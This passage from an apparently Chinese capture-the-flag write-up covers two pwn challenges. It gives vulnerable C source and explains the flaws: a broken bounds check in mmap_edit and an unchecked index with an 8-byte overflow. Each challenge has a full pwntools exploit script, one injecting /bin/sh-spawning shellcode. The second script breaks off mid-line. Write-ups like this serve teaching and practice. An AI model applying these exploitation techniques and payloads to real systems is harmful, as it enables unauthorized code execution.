class="keyword">unsigned</span> idx;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">    idx = get_int(); </span><br><span class="line">    <span class="keyword">if</span>(idx &gt;= NUM || chunks[idx] == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content: %s\n&quot;</span>, chunks[idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readn</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">unsigned</span> size)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">unsigned</span> i = <span class="number">0</span>; i &lt; size; i++)&#123;</span><br><span class="line">        read(<span class="number">0</span>, s + i, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(s[i] == <span class="string">&#x27;\n&#x27;</span>)<span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> idx;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">    idx = get_int(); </span><br><span class="line">    <span class="keyword">if</span>(idx &gt;= NUM || chunks[idx] == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>); </span><br><span class="line">    readn(chunks[idx], sizes[idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. allocate&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. edit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. show&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4. delete&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5. exit&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your choice: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    init_io();</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="keyword">unsigned</span> choice = get_int();</span><br><span class="line">        <span class="keyword">switch</span>(choice)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                allocate();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                edit();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                show();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">delete</span>();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                mmap_allocate();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                mmap_edit();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">                mmap_delete();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Unknown&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>先使用堆块布局泄漏libc, 然后通过mmap_edit 中的漏洞实现高地址写入, 修改 exit_hook   </p>
<p> _rtld_lock_unlock_recursive 为mmap开辟的地址, 然后调用exit时跳转到mmap开辟的地址执行shellcode</p>
<p>mmap_edit漏洞: </p>
<h3 id="Vul"><a href="#Vul" class="headerlink" title="Vul"></a>Vul</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmap_edit</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(g_ptr == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Mmap first!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> value;</span><br><span class="line">    <span class="keyword">unsigned</span> idx;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">    idx = get_int(); </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(g_ptr + idx &lt; g_ptr &amp;&amp; (<span class="keyword">unsigned</span>)(g_ptr + idx) &lt; ADDR_HIGH)&#123; <span class="comment">//漏洞</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid idx&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Value: &quot;</span>);</span><br><span class="line">    value = get_int(); </span><br><span class="line">    g_ptr[idx] = value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">exeFile = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line"><span class="comment">#libFile = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">libFile = <span class="string">&#x27;./libc-2.27.so&#x27;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">remotePort = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">LIB   = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>(<span class="params">idx, size</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md</span>(<span class="params">idx, data</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">	sa(<span class="string">&#x27;:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dp</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>))	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mad</span>(<span class="params">start_addr</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">6</span>))	</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(start_addr))	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mmd</span>(<span class="params">idx, value</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">7</span>))</span><br><span class="line">	sla(<span class="string">&#x27;x:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">	sla(<span class="string">&#x27;e:&#x27;</span>, <span class="built_in">str</span>(value))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mrm</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">8</span>))	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">m_ad_sc</span>(<span class="params">sc</span>):</span></span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">len</span>(sc) % <span class="number">4</span> != <span class="number">0</span>):</span><br><span class="line">		sc += <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">	sc_len = <span class="built_in">len</span>(sc)</span><br><span class="line">	li(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(sc_len / <span class="number">4</span>):</span><br><span class="line">		j = i * <span class="number">4</span></span><br><span class="line">		s = sc[j : j + <span class="number">4</span>]</span><br><span class="line">		n = u32(s)</span><br><span class="line">		mmd(i, n)</span><br><span class="line">		li(<span class="built_in">hex</span>(n))</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	li(rl())</span><br><span class="line"></span><br><span class="line">	ad(<span class="number">0</span>, <span class="number">0x100</span>)</span><br><span class="line">	ad(<span class="number">1</span>, <span class="number">0x100</span>)</span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line">	rm(<span class="number">1</span>)</span><br><span class="line">	ad(<span class="number">0</span>, <span class="number">0x100</span>)</span><br><span class="line">	dp(<span class="number">0</span>)</span><br><span class="line">	ru(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">	heap_base = u32(ru(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">-4</span>:]) - <span class="number">0x160</span></span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># leak libc</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">		ad(i,<span class="number">0x100</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">		rm(i)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">		ad(i,<span class="number">0x100</span>)</span><br><span class="line">	md(<span class="number">7</span>, <span class="string">&#x27;AAA\n&#x27;</span>)</span><br><span class="line">	dp(<span class="number">7</span>)</span><br><span class="line">	libc_base = u32(ru(<span class="string">&#x27;\xf7&#x27;</span>)[<span class="number">-3</span>:] + <span class="string">&#x27;\xf7&#x27;</span>) - (<span class="number">0xf7f107d8</span> - <span class="number">0xf7d38000</span>)</span><br><span class="line">	libc_got  = libc_base + (<span class="number">0xf7f20000</span> - <span class="number">0xf7d48000</span>)</span><br><span class="line">	exit_hook = libc_base + <span class="number">0x209838</span></span><br><span class="line">	<span class="comment"># p _rtld_global</span></span><br><span class="line">	<span class="comment"># _rtld_lock_unlock_recursive</span></span><br><span class="line">	<span class="comment"># _rtld_lock_lock_recursive</span></span><br><span class="line"></span><br><span class="line">	li(<span class="string">&#x27;heap_base :&#x27;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line">	li(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base)) </span><br><span class="line">	li(<span class="string">&#x27;libc got: &#x27;</span> + <span class="built_in">hex</span>(libc_got)) </span><br><span class="line">	li(<span class="string">&#x27;exit_hook: &#x27;</span> + <span class="built_in">hex</span>(exit_hook)) </span><br><span class="line"></span><br><span class="line">	mad(libc_base &amp; <span class="number">0xFFFFFFF</span>)</span><br><span class="line"></span><br><span class="line">	midx = (exit_hook - (<span class="number">0xe0000000</span> + (libc_base &amp; <span class="number">0xFFFFFFF</span>))) / <span class="number">4</span></span><br><span class="line">	maddr = <span class="number">0xe0000000</span> + (libc_base &amp; <span class="number">0xFFFFFFF</span>)</span><br><span class="line"></span><br><span class="line">	li(<span class="string">&#x27;maddr: &#x27;</span> + <span class="built_in">hex</span>(maddr)) </span><br><span class="line">	li(<span class="string">&#x27;hex &#x27;</span> + <span class="built_in">hex</span>(midx))</span><br><span class="line"></span><br><span class="line">	mmd(midx, maddr)</span><br><span class="line"></span><br><span class="line">	sc = <span class="string">&quot;\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line">	m_ad_sc(sc)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line">	q()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">			io = exe.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = exe.process()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		io = remote(remoteIp, remotePort)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">	</span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br></pre></td></tr></table></figure>





<h2 id="4-Galgame"><a href="#4-Galgame" class="headerlink" title="4-Galgame"></a>4-Galgame</h2><h3 id="Vul-1"><a href="#Vul-1" class="headerlink" title="Vul"></a>Vul</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( p_addr[atoi((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf)] )</span><br><span class="line">         &#123;</span><br><span class="line">           <span class="built_in">printf</span>(<span class="string">&quot;movie name &gt;&gt; &quot;</span>, &amp;buf);</span><br><span class="line">           v4 = atoi((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf); <span class="comment">//对v4没有进行溢出检查, 也可以对p_addr附近存在的地址进行写入</span></span><br><span class="line">           read(<span class="number">0</span>, (<span class="keyword">void</span> *)(p_addr[v4] + <span class="number">0x60</span>), <span class="number">0x10</span>uLL);<span class="comment">// 溢出8字节漏洞</span></span><br><span class="line">           <span class="built_in">puts</span>(<span class="string">&quot;\nHotaru: What a good movie! I like it~\n&quot;</span>);</span><br><span class="line">           <span class="built_in">puts</span>(<span class="string">&quot;[ You&#x27;ve gained a lot favor of her! ]&quot;</span>);</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure>



<p>先通过8字节溢出修改top chunk size, 开辟0x1000不够, 则实现free功能泄漏libc, 在通过v4没有检查漏洞可进行数组越界和退出输入配合实现任意地址写入, 修改libc puts中<em>ABS</em>+0x9dce0plt 跳转的 got表打one_gadget</p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: I0gan</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">exeFile = <span class="string">&#x27;Just_a_Galgame&#x27;</span></span><br><span class="line"><span class="comment">#libFile = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">libFile = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">remotePort = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">LIB   = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad_68</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mv</span>(<span class="params">idx, name</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">	sa(<span class="string">&#x27;&gt;&gt;&#x27;</span>, name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad_1000</span>():</span>	</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dp</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">	sa(<span class="string">&#x27;QAQ\n&#x27;</span>, <span class="string">&#x27;No bye!\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line"></span><br><span class="line">	ad_68()</span><br><span class="line">	mv(<span class="number">0</span>, <span class="string">&#x27;\x00&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0xd41</span>))</span><br><span class="line">	ad_1000()</span><br><span class="line">	ad_68()</span><br><span class="line">	dp()</span><br><span class="line">	libc_base = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">&#x27;\x7f\x00\x00&#x27;</span>) - (<span class="number">0x7f70a91f92a0</span> - <span class="number">0x7f70a8e0d000</span>)</span><br><span class="line">	li(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">	target = libc_base + (<span class="number">0x8880a8</span> - <span class="number">0x49d000</span>)</span><br><span class="line">	one_gadget = libc_base + <span 